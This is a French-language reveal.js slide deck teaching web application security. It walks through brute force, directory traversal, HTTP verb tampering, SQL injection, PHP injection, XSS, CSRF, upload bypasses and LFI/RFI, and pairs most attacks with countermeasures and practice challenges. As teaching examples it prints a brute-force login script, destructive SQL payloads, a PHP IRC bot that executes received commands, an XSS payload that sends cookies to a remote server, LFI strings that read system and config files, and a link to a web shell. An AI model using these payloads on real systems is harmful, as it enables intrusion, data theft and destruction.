<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">

	<title>Sécurité des applications | Thomas Perrin</title>

	<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
	<meta name="author" content="black reaven">

	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

	<link rel="stylesheet" href="css/reveal.min.css">
	<link rel="stylesheet" href="css/theme/blood.css" id="theme">

	<!-- For syntax highlighting -->
	<link rel="stylesheet" href="lib/css/tomorrow-night-eighties.css">

	<!-- If the query includes 'print-pdf', use the PDF print sheet -->
	<script>
		document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
	</script>
		<!--[if lt IE 9]>
		<script src="lib/js/html5shiv.js"></script>
		<![endif]-->
	</head>

	<body>

		<div class="reveal">

			<!-- Any section element inside of this container is displayed as a slide -->
			<div class="slides">
				<section data-background="images/home_hacker.jpg" >
					<h1>Sécurité</h1>
					<h3>Des applications web</h3>
					<p>
						<small>par <a href="#">Thomas PERRIN</a></small>
					</p>
					
				</section>

				<section data-background="images/home_hacker.jpg" data-transition="zoom" data-background-transition="slides">
					<section>
						<h2>Sécurité ?</h2>
						<ol>
						    <li class="fragment">Définition</li>
							<li class="fragment">Les bases de la sécurisation</li>
							<li class="fragment">Comment se déroule une attaque ?</li>
						</ol>
                        <p>
							<img class="fragment" src="http://media.tumblr.com/b66213f2bb3e7ecb51a4152c12d3d1d2/tumblr_inline_mgkr9q3xHc1r8oot9.gif" alt="">
						</p>
					</section>
					<section>
						<h2>Définition</h2>
						<p>Les principes de la sécurité des application sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succès d'une attaque et l'impact de celle-ci . Les principes de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisés dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisées.</p>
						<a target="_blank" href="https://www.owasp.org/index.php/Category:Principle">owasp</a>
					</section>
					<section>
						<h2>Les principes de bases</h2>
						<ol>
                            <li class="fragment">Sécurisation à tous les niveaux de l'application</li>
                            <li class="fragment">Minimiser les points d'entrée d'une attaque</li>
                            <li class="fragment">Minimiser l'impact des erreurs</li>
                            <li class="fragment">Exécuter avec le minimum de droit</li>
                            <li class="fragment">Garder un système de sécurité le plus simple possible</li>
                            <li class="fragment">Détecter les intrusion (mettre suffisament de logs)</li>
                            <li class="fragment">Ne jamais faire confiance à l'infrastructure</li>
                            <li class="fragment">Ne pas faire confiance aux utilisateurs</li>
                        </ol>
					</section>
					<section>
						<h2>Comment se déroule une attaque ?</h2>
                        <h3>Détection</h3>
                        <p>Un attaquant va chercher à récupérer des informations utiles sur sa cible (application et système).</p>
                        <ul>
                            <li>Framework</li>
                            <li>CMS</li>
                            <li>OS du serveur</li>
                            <li>URL pouvant offrir un point d'entrée</li>
                        </ul>
						<aside class="notes">
    						<ul>
    							<li>
    								Recherche google
    								<ul>
    									<li>inurl:?id=</li>
    									<li>inurl:robot.txt</li>
    								</ul>
    							</li>
    							<li>
    								Identification des URLs des CMS
    								<ul>
    									<li>Drupal /user ou ?q=user</li>
    									<li>Ezpublish /administration</li>
    									<li>Wordpress /wp-admin</li>
    								</ul>					
    							</li>
    							<li>
    								Provoquer des erreurs pour identifier le serveur
    								TODO trouver des images d'erreur nginx / apache
    							</li>
    						</ul>
    					</aside>
					</section>
					<section>
						<h2>Google est votre ami... </h2>
						<h3>... mais aussi celui des hackers</h3>
						<p>
							Google comporte des <em>easter eggs</em> qui sont devenus des filtres très utiles pour repérer des sites vulnérables.
							
							<a target="_blank" href="http://www.googleguide.com/advanced_operators_reference.html">http://www.googleguide.com/advanced_operators_reference.html</a>
						</p>
					</section>
					<section>
						<h2>Comment se déroule une attaque ?</h2>

						<h3>Test des attaques</h3>
						<p>
							L'attaquant teste les points d'entrée potentiels qu'il a trouvé.
						</p>
					</section>
					<section>
						<h2>Comment se déroule une attaque ?</h2>

						<h3>Exploitation des failles</h3>
                        <ul>
                            <li>Prise de contrôle de l'infrastructure</li>
                            <li>Vol de données</li>
                            <li>Modification de donnée(s)</li>
                            <li>Mise hors-service de l'application ou du système</li>
                        </ul>
					</section>
				</section>

				<!-- Example of nested vertical slides -->
				<section>
					<h2>Les attaques</h2>
                    <ol>
                        <li>Brute force</li>
                        <li><em>Traversal directory</em></li>
                        <li>Authentification HTTP</li>
                        <li >Injections
                            <ul>
                                <li>Injection sql</li>
                                <li>Injection de code PHP</li>
                                <li>XSS - <em>Cross Site Scripting</em></li>
                                <li>CSRF - <em>Cross Site Request Forgery</em></li>
                            </ul>
                        </li>
                        <li >Upload / RFI / LFI</li>
                    </ol>
				</section>

				<section>
					<section>
						<h2><em>Brute force</em></h2>
						<p>
							Le but d'un <em>brute forcing</em> est de trouver les paramètres de connexion en testant toutes les possibiltés.
						</p>
						<img class="fragment" src="http://www.reactiongifs.com/wp-content/uploads/2013/12/hulksmash.gif" alt="">
					</section>
					<section>
						<h2>Brute force - Exemple</h2>
						<p>Voici un simple code generant des mot de passe et les testant sur l'acces à l'administration d'un site vulnérable.</p>
						<pre><code data-trim contenteditable class='ruby' ><![CDATA[
@agent = Mechanize.new

url = "http://vulnerable/admin"
login_action = '/admin'
login = 'admin'
pass = ""
?a.upto('zzzzz') do |x|
  @agent.get url do |page|
    page.forms.each do |form|
      if form.action == login_action
        form['_username'] = login;
        form['_password'] = x;
        page = form.submit
        if(not page.body.to_s.index('incorrect'))
          p "Password found : "<<x
          exit()
        end
      end
    end
  end
end]]></code></pre>
					</section>
					<section>
						<h2><em>Brute force</em> - Améliorations</h2>
                        <ul>
                            <li>Attaque par dictionnaire</li>
                            <li>Optimisation de la génération</li>
                            <li>Accroissement de la puissance de calcul (supercalculateur, calcul distribué ou <em>botnet</em>)</li>
                        </ul>
					</section>
					<section>
						<h2><em>Brute force</em> - Solution</h2>
                        <ul>
                            <li>Utilisation de mots de passe robustes</li>
                            <li>Génération aléatoire des mots de passe</li>
                            <li>Eviter de donner trop d'informations dans les messages d'erreur</li>
                            <li>Augmenter le temps à chaque tentative (timeur, captcha, etc..)</li>
                            <li>Limiter le nombre de tentatives possibles</li>
                            <li>Renouveller les mots de passes</li>
                        </ul>
					</section>
				</section>

				<section>
					<section>
						<h2><em>Traversal directory</em></h2>
						<p>
							Le but du <em>traversal directory</em> est de récupérer le lien vers des répertoires ou des fichiers non protégés.
						</p>
					</section>
					<section>
						<h2><em>Traversal directory</em> - Exemple</h2>
						<p>Ici l'attaquant va essayer de trouver la page d'administration</p>
						<pre><code data-trim contenteditable>
						http://exemple.com
http://exemple.com/admin
http://exemple.com/administration
http://exemple.com/wp-admin
						</code></pre>
						<p>Ici l'attaquant va essayer de trouver le répertoire d'upload des documents</p>
						<pre><code data-trim contenteditable>
						http://exemple.com/media
http://exemple.com/pdf
http://exemple.com/document
http://exemple.com/upload
						</code></pre>
						<p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch15/ch15.php">Challenge Traversal directory</a></p>
					</section>
					<section>
						<h2><em>Traversal directory</em> - Solution</h2>

                        <ul>
                            <li>Ajouter un index.php/.html dans les répertoire</li>
                            <li>
                                Protéger avec un .htaccess
                                <ul>
                                    <li>Faire une redirection vers l'index</li>
                                </ul>
                            </li>
                        </ul>
					</section>
				</section>
				<section>
					<section>
						<h2>Authentification HTTP</h2>
						<p>
							Le protocole HTTP fournit un moyen de gérer une authentification et de restreindre l'accès à une ressources.
							Il existe deux méthodes pour gérer cette authentification :
                        </p>
                        <ul>
                            <li><em>HTTP Basic Auth</em></li>
                            <li><em>HTTP Digest Auth</em></li>
                        </ul>

						<aside class="notes">
							
						</aside>
					</section>
					<section>
						<h2>HTTP Basic Auth</h2>
						<p>
							Si le serveur ne reçoit pas dans l'entête HTTP l'identification correcte, voici le genre d'en-tête envoyé :
						</p>
						<pre><code>WWW-Authenticate: Basic realm="Secured Access"</code></pre>
						<p>
							Et voici le genre d'en-tête d'identification qui sera attendu:
						</p>
						<pre><code>Authorization: Basic YWRtaW46YWRtaW4=</code></pre>
						<p>
							
						</p>
						<pre><code class="php">'YWRtaW46YWRtaW4=' == base64_encode('admin:admin')</code></pre>
					</section>
					<section>
						<h2><em>HTTP Verb</em></h2>
						<p>
							Les verbes HTTP sont les méthodes utilisées pour indiquer l'action desirée.
                        </p>
                        <ul>
                            <li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une URL</li>
                            <li><strong>POST</strong> : Demande d'une ressource avec des données encapsulées dans la requête</li>
                            <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                            <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
                            <li><strong>HEAD</strong> : Demande des en-têtes</li>
                        </ul>
                        <aside class="notes">
                            <p>Liste exhaustive des verbes :</p>
							<ul>
                                <li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une URL</li>
                                <li><strong>POST</strong> : Demande d'une ressource avec des données encapsulées dans la requête</li>
                                <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                                <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
                                <li><strong>HEAD</strong> : Demande des en-têtes</li>
								<li><strong>TRACE</strong> : Permet de tracer les requêtes reçues par le serveur</li>
								<li><strong>OPTIONS</strong> :  Demande des méthodes supportées par le serveur</li>
								<li><strong>CONNECT</strong> :  Convertit la requête en tunnel TCP/IP</li>
								<li><strong>PATCH</strong> : Demande de modification partielle d'une ressource sur le serveur</li>
							</ul>
						</aside>
					</section>
					<section>
						<h2><em>HTTP verb Tampering</em></h2>
						<p>
							Cette attaque permet de contourner (<em>by-pass</em>) une authentification HTTP basique si les .htaccess et le serveur ont été mal paramétrés.
							<a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch8">Challenge HTTP Verb Tampering</a>
						</p>
					</section>

					<section>
						<h2><em>HTTP verb Tampering</em> - Exemple</h2>
						<p>
						Voici un fichier .htaccess faillible : 
						<pre>
						<code data-trim>
AuthName “restrict access”
AuthType Basic
AuthUserFile .htpasswd
< Limit GET POST >
require group staff
< /Limit >
						</code>
						</pre>
                        <p>
                            Ici on limite l'accèss en GET et POST à une ressource via une authentification. Mais que se passe-t-il si on demande la page avec une autre methode HTTP ?
						</p>

						</section>
						<section>
						<h2><em>HTTP verb Tampering</em> - Exemple</h2>

						<pre><code data-trim>
PUT /admin/secured HTTP/1.1
Host: www.target.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: max-age=0
						</code></pre>

					</section>
				</section>
				<section>
					<section>
						<h2>Injections</h2>
						<p>
							Le but des injections va être de faire exécuter du code source au serveur ou au navigateur de la victime. Il en existe plusieurs types.
                        </p>
                        <ol>
                            <li class="fragment">Injection sql</li>
                            <li class="fragment">Injection de code applicatif
                                <ul>
                                    <li>Injection de code client (HTML/CSS/Javascript)</li>
                                    <li>Injection de code serveur (PHP/Java/.Net/XML/Json/LDAP/...)</li>
                                </ul>
                            </li>
                        </ol>

					</section>
				</section>
				<section>
					<section>
						<h2>Injections sql</h2>
						
						<p>
							Le but d'une injection SQL est de faire exécuter une requête SQL au serveur afin de modifier son comportement.
						</p>


					</section>
					<section>
						<h2>Injections SQL - Exemple 1</h2>
						
						<p>
							L'attaquant va injecter du code SQL dans le mot de passe afin de court-circuiter la vérification de sa validité.
                        </p>
                        <pre><code data-trim class="php">
$query = $pdo->prepare("select * from FROM users WHERE username='$username' AND password='$password'");
$user = $query->execute();
                        </code></pre>
                        <p>
							La requête exécutée est donc :
                        </p>
                        <pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' AND password='admin'</code></pre>
                        <p>
							Maintenant, si a la place de <code data-trim class="php">$password</code> l'attaquant met :
                        </p>
						<pre><code data-trim class="php">' OR '1'='1</code></pre>
						<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' </code></pre>
						<pre><code data-trim class="sql">' OR 1=1"); DROP TABLE users; </code></pre>
						<pre><code data-trim class="sql">'; shutdown with nowait; -- </code></pre>
					</section>
					<section>
					<h2>Injections SQL - Exemple 2</h2>
						
						<p>
							La requête :
                        </p>
							<pre><code data-trim class="sql">SELECT email from FROM users where username='$username'</code></pre>
                        <p>
							Maintenant si à la place de <code data-trim class="php">$username</code> l'attaquant met :
                        </p>
							<pre><code data-trim class="sql">' UNION SELECT password FROM users WHERE id=1</code></pre>
							<pre><code data-trim class="sql">SELECT email from FROM users WHERE username='' UNION SELECT password FROM users WHERE id=1</code></pre>
					</section>
					<section>
						<h2>Injections SQL - Le but</h2>
						<ul>
							<li>Accéder à des données auxquelles on ne devrait pas avoir accès</li>
							<li>Modifier des données</li>
							<li>Effacer des données</li>
							<li>Lire/écrire sur le système de fichiers</li>
							<li>Exécuter des commandes systèmes</li>
						</ul>
                        <p>
                            <a target="_blank" href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
							<a target="_blank" href="https://www.owasp.org/index.php/Blind_SQL_Injection">https://www.owasp.org/index.php/Blind_SQL_Injection</a>
						</p>
					</section>
					<section>
						<h2>Challenge Injection sql</h2>
						<p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch9/">Challenge injection sql</a></p>
					</section>
					<section>
						<h2>Injections SQL - Solutions</h2>

                        <ul>
                            <li>Ne pas afficher les erreurs <em>mysql</em></li>
                            <li>Échapper les caractères spéciaux
                                <ul>
                                    <li><em>$mysqli->real_escape_string()</em> depuis PHP 5.5</li>
                                    <li><em>mysqli_escape_string()</em> pour les versions antérieures</li>
                                </ul>
                            </li>
                            <li>Utiliser une requête préparée</li>
                            <li>Utiliser des comptes utilisateurs SQL à accès limité (en lecture-seule) quand cela est possible.</li>
                        </ul>

					</section>
				</section>
				<section>
					<section>
						<h2>Injection PHP</h2>
						<p>
							Le but de l'injection de code applicatif va être de modifier le comportement de l'application coté serveur.
						</p>
					</section>
					<section>
						<h2>Injection PHP- <em>Register</em> global</h2>
						<p>
							La faille de sécurité "<em>Register</em> global" vient d'une configuration de PHP <a target="_blank" href="http://php.net/manual/fr/security.globals.php"><em>register_globals</em></a> qui, si elle est activée peut faciliter la création de failles.
							Si le <em>register_globals</em> a la valeur '<em>On</em>' alors toutes les variables $_GET, $_POST, $_SERVER sont diponibles sous la forme de variables PHP.
                        </p>
                        <pre><code data-trim class="php">
// $username est injecté par PHP directement si register_globals = On
$username    == $_POST['username']
$username    == $_GET['username']
$username    == $_SESSION['username']
                        </code></pre>

						<aside class="notes">
                            <ul>
                                <li>
                                    PHP 5.3 obsolète
                                </li>
                                <li>
                                    PHP 5.4 supprimé
                                </li>
                            </ul>
						</aside>
					</section>
					<section>
						<h2><em>Register</em> global - Exemple</h2>

                        <pre><code data-trim class="php">
if($logged){
// display admin information
}
                        </code></pre>
                        <pre><code data-trim class="php">
                            http://example.com/admin?logged=1
                        </code></pre>
                        <p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch17/">Challenge Register global</a></p>
					</section>
					<section>
						<h2><em>Register</em> global - Solution</h2>
                        <ul>
                            <li>Faire attention aux variables qu'on utilise</li>
                            <li>Désactiver les <em>register_globals</em> dans la config de PHP</li>
                        </ul>
					</section>
					<section>
						<h2>Injection PHP</h2>
						
						<p>
							Certains sites permettent aux utilisateurs de contribuer directement du code PHP. (ex: Drupal)
                        </p>
 						<pre><code data-trim class="php">
set_time_limit(0);
$socket = fsockopen('irc.epiknet.org','6667');

if(!$socket)
{
	echo 'Impossible de se connecter';
	exit;
}
fputs($socket,"USER PwnBot PwnBot PwnBot PwnBot\r\n");
fputs($socket,"NICK PwnBot\r\n");
fputs($socket,"JOIN #botnet_chan\r\n");

$continuer = 1;
while($continuer)
{
	$donnees = fgets($socket, 1024);
	$retour = explode(':',$donnees); // On sépare les différentes données.
	// On regarde si c'est un PING, et, le cas échéant, on envoie notre PONG :
	if(rtrim($retour[0]) == 'PING')
	{
		fputs($socket,'PONG :'.$retour[1]);
	}
	if($rtrim($retour[0]) == 'PRIVMSG')
		exec($retour[3]);
}
						</code></pre>

					</section>
				</section>
				<section>
					<section>
						<h2>XSS - <em>Cross Site Scripting</em></h2>
						<p>
							XSS où « <em>Cross-Site Scripting</em> » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
						</p>
						<p>
							Le but de cette attaque est d’effectuer un certain nombre d’actions dans le navigateur de la victime.
						</p>
						<p>
							Les risques sont multiples :
                        </p>
                        <ul>
                            <li>Défacement</li>
                            <li>Redirection</li>
                            <li>Vol de données</li>
                        </ul>
					</section>
					<section>
						<h2>Injection XSS</h2>
						<p>Défacement</p>
						<pre><code data-trim class="html">
&lt;script type="text/javascript"&gt;
	msg = "Vous êtes victime d’une attaque XSS !";
	document.write(msg);
&lt;/script&gt;
						</code></pre>
						<p>Redirection</p>
						<pre><code data-trim class="html">
&lt;script type="text/javascript"&gt;
	document.location = "http://www.serveur-distant.net/page-piege.php";
&lt;/script&gt;
						</code></pre>
						<p>Vol de cookie</p>
						<pre><code data-trim class="html">
&lt;script type="text/javascript"&gt;
	var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie;
	var imgTag = document.createElement("img");
	imgTag.setAttribute("src",addr);
	document.body.appendChild(imgTag);
&lt;/script&gt;
						</code></pre>
					</section>
					<section>
						<h2>Challenge XSS</h2>
						<p><a target="_blank" href="http://challenge01.root-me.org//web-client/ch18/">Challenge XSS</a></p>
					</section>
					<section>
						<h2>Injection XSS - Solution</h2>

                        <ul>
                            <li>
                                Supprimer les balises HTML des données venant des utilisateurs mais aussi de la base de données
                                <ul>
                                    <li><em>htmlspecialchars()</em></li>
                                    <li><em>htmlentities()</em></li>
                                    <li><em>strip_tags()</em></li>
                                </ul>
                            </li>
                        </ul>

					</section>
					<section>
						<h2>Injection CSRF - <em>Cross Site Request Forgery</em></h2>
						
						<p>
							L'approche est la même que les XSS mais le but est différent : il s'agit de faire exécuter une requête à une victime.
                        </p>
                        <pre><code data-trim class="html">
                            <img src="/post/2/delete" />
                        </code></pre>
					</section>
					<section>
						<h2>Injection CSRF - Solutions</h2>
						<p>
							Utilisation de token CSRF pour éviter que des requête puisssent être rejouées.
						</p>
					</section>
				</section>

				<section>
					<h2>Les faille Upload/LFI/RFI</h2>
					<p>
						Ces failles sont dûes à des failles dans les script d'upload ou dans l'inclusion de fichiers sans contrôle dans une page.
					</p>
				</section>

				<section>
					<section>
						<h2>Faille <em>upload</em></h2>
						<p>
							La faille <em>upload</em> permet a un attaquant d'uploader un fichier sur le serveur qui va contenir du code malveillant.

							L'objectif est de corrompre le serveur grâce à des <em>trojan</em>, <em>worm</em>, et autre <em>malware</em>.
						</p>
					</section>
					<section>
						<h2>Faille <em>upload</em> - Basique</h2>
                        <pre><code data-trim class="php">
$resultat = move_uploaded_file($_FILES['avatar']['tmp_name'],'files/'.$_FILES['avatar']['name']);
if ($resultat) echo "Transfert réussi";
                        </code></pre>
                        <p>
							Ici, aucun contrôle n'est réalisé sur le fichier chargé donc n'importe quel fichier pourrait être uploadé sur le serveur (un fichier PHP, par exemple).
						</p>
					</section>

					<section>
						<h2>Faille <em>upload</em> - <em>Null byte</em></h2>

						<pre><code class="php">
$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );
//1. strrchr renvoie l'extension avec le point (« . »).
//2. substr(chaine,1) ignore le premier caractère de chaine.
//3. strtolower met l'extension en minuscules.
$extension_upload = strtolower(  substr(  strrchr($_FILES['avatar']['name'], '.')  ,1)  );
if ( in_array($extension_upload,$extensions_valides) ) echo "Extension correcte";
						</code></pre>
                        <p>
							Ici, on vérifie l'extension du fichier uploadé. <br /><br />
							Les <em>Null bytes</em> sont des caractères avec la valeur zéro qui en principe marque la fin d'une chaine de caractères. Si un attaquant voulait uploader quand même un fichier PHP, il lui suffirait de renommer son fichier :
                        </p>
						<pre><code>c99.php%00.png</code></pre>

					</section>
					<section>
						<h2>Faille <em>upload</em> - Spoofing mime-type</h2>
						<p>
							Certains sites vont vérifier le <em>mime-type</em>, le type de fichier uploadé.
							Exemple de données envoyées en POST lors d'un upload :
                        </p>
						<pre><code>-----------------------------312964014798731795365001168\r\n
Content-Disposition: form-data; name="file"; filename="test.php"\r\n
Content-Type: text/php\r\n\r\n<?php\necho 'powned';\n?>\r\n
-----------------------------312964014798731795365001168--\r\n</code></pre>
                        <p>
							Pour modifier le type de fichier, il suffit de modifier :
                        </p>
						<pre><code>-----------------------------312964014798731795365001168\r\n
Content-Disposition: form-data; name="file"; filename="test.php"\r\n
Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
-----------------------------312964014798731795365001168--\r\n</code></pre>

					</section>
					<section>
						<h2>Faille <em>upload</em> - Solutions</h2>
						<ul>
                            <li>Ne jamais se fier à ce que peut envoyer le client.</li>
                            <li>Vérifier la configuration d’Apache afin d’agir en conséquence.</li>
                            <li>Ne pas placer le .htaccess dans le répertoire d’upload</li>
                            <li>Ne pas permettre l’écrasement de fichier</li>
                            <li>Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.</li>
                            <li>Ne pas permettre de voir l’index du répertoire d’upload.</li>
                            <li>Assigner les bonnes permissions au répertoire.</li>
                            <li>Vérifier le <em>mime-type</em> avec <em>getimagesize()</em> et l’extension du fichier.</li>
						</ul>
					</section>
					<section>
						<h2>Upload - Challenges</h2>
						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch22/">Null byte</a></p>
						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch21/">Mime type</a></p>
					</section>
				</section>

				<section>
					<section>
						<h2>Faille LFI/RFI</h2>
						<p>
							Les failles LFI/RFI viennent d'un appel à la fonction PHP <code class="php">include</code>, non sécurisée, qui permet d'inclure soit à des fichiers locaux (LFI - <em>Local File Include</em>), ou d'injecter un script PHP distant (RFI - <em>Remote File Include</em>)
						</p>
					</section>

					<section>
						<h2>Faille LFI/RFI</h2>
						<pre><code class="php">$incfile = $_REQUEST["file"];
include($incfile.".php");</code></pre>
						<p>Appel normal de l'url : </p>
						<pre><code>http://vulnerable/?file=index</code></pre>	
						<p>Appel avec un fichier local : </p>
						<pre><code>http://vulnerable/?file=/etc/password%00</code></pre>	
						<p>Appel avec un fichier distant : </p>
						<pre><code>http://vulnerable/?file=http://c99.php%00</code></pre>
						<p>Appel avec des filters pour récupérer les sources du fichier config.php : </p>						
						<pre><code>http://vulnerable/?file=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
						<p>Un exemple de fichier php qui peut créer des dégats : <a target="_blank" href="images/c99.php">C99</a></p>	
					</section>
					<section>
						<h2>LFI - Challenge</h2>
						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch16/">LFI challenge</a></p>
						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch12">LFI php filter</a></p>
					</section>
				</section>
				<section>
					<h2>La boite à outils</h2>

                    <ul>
                        <li><a target="_blank" href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
                        <li><a target="_blank" href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
                        <li><a target="_blank" href="http://sqlmap.org/">SQLMap</a></li>
                        <li><a target="_blank" href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
                        <li><a target="_blank" href="https://addons.mozilla.org/fr/firefox/addon/tamper-data/">Tamper Data</a></li>
                        <li><a target="_blank" href="https://code.google.com/p/fimap/">fimap</a></li>
                        <li><a target="_blank" href="https://www.pentesterlab.com/">Pentester Lab</a></li>
                    </ul>

				</section>
				<section>
					<h1>Questions ? Doliprane ?</h1>
				</section>

			</div>

	</div>

	<script src="lib/js/head.min.js"></script>
	<script src="js/reveal.min.js"></script>

	<script>

				// Full list of configuration options available here:
				// https://github.com/hakimel/reveal.js#configuration
				Reveal.initialize({
					controls: true,
					progress: true,
					history: true,
					center: true,

					theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
					transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none

					// Parallax scrolling
					// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
					// parallaxBackgroundSize: '2100px 900px',

					// Optional libraries used to extend on reveal.js
					dependencies: [
					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
					]
				});

	</script>

</body>
</html>
